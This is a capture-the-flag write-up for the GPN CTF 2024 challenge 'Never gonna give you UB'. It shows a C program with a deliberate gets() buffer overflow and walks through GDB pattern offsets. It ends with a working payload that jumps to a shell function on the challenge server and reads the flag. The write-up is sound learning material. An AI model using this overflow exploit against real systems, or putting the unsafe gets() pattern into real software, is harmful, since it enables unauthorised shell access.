---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: Never gonna give you UB
ctf-category: web
ctf-difficulty: 
---
# Never gonna give you UB

## Description

> Can you get this program to do what you want?

## Analysis

Code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void scratched_record() {
        printf("Oh no, your record seems scratched :(\n");
        printf("Here's a shell, maybe you can fix it:\n");
        execve("/bin/sh", NULL, NULL);
}

extern char *gets(char *s);

int main() {
        printf("Song rater v0.1\n-------------------\n\n");
        char buf[0xff];
        printf("Please enter your song:\n");
        gets(buf);
        printf("\"%s\" is an excellent choice!\n", buf);
        return 0;
}
```

The goal is to overwrite the buffer `buf`  and jump to the `scratched_record` function in order to start a shell and read the flag.

## Solution

Start binary in GDB (gdb-peda was used to simplify some stuff):
```text
$ gdb ./song_rater
gdb-peda$
```

Create a pattern:
```text
gdb-peda$ pattern_create 400                                                                                                                                   
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATA
AqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A
%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'
```

Start the program with the generated pattern as input and let it crash:
```text
gdb-peda$ run < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")')
Starting program: /home/emanuel/gpn22ctf/never-gonna-give-you-ub/song_rater < <(python -c 'print("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Song rater v0.1
-------------------

Please enter your song:
"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y" is an excellent choice!

Program received signal SIGSEGV, Segmentation fault.
```

The stack pointer `RSP` contains an address pointing to the following string: 
```text
RSP: 0x7fffffffdac8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
```

Therefore, it's possible to control the stack pointer value. The controllable offset starts at byte 264:
```text
gdb-peda$ pattern_offset "HA%dA%3A%IA%eA%4"
HA%dA%3A%IA%eA%4 found at offset: 264
```

The `scratched_record` function that starts a shell starts at `0x0000000000401196`:
```text
gdb-peda$ disass scratched_record 
quit
Dump of assembler code for function scratched_record:
   0x0000000000401196 <+0>:     endbr64
   0x000000000040119a <+4>:     push   rbp
[...]
```

Filling the buffer with 263 bytes of `A` and then the address of the `scratched_record` function in order to call it:
```text
gdb-peda$ run < <(python -c 'print("A" * 263 + "\x96\x11\x40\x00\x00\x00\x00\x00")')

Starting program: /home/emanuel/gpn22ctf/never-gonna-give-you-ub/song_rater < <(python -c 'print("A" * 263 + "\x96\x11\x40\x00\x00\x00\x00\x00")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Song rater v0.1
-------------------

Please enter your song:
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@" is an excellent choice!
Oh no, your record seems scratched :(
Here's a shell, maybe you can fix it:
process 40380 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
```

The output shows that the shell was started.

Running the exploit against the target system to get a shell and read the flag:
```text
$ (python -c 'print("A" * 263 + "\x96\x11\x40\x00\x00\x00\x00\x00")'; cat ) | ncat --ssl only-time--gunna-1152.ctf.kitctf.de 443
Song rater v0.1
-------------------

Please enter your song:
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@" is an excellent choice!
Oh no, your record seems scratched :(
Here's a shell, maybe you can fix it:
cat /flag
GPNCTF{G00d_n3w5!_1t_l00ks_l1ke_y0u_r3p41r3d_y0ur_disk...}
```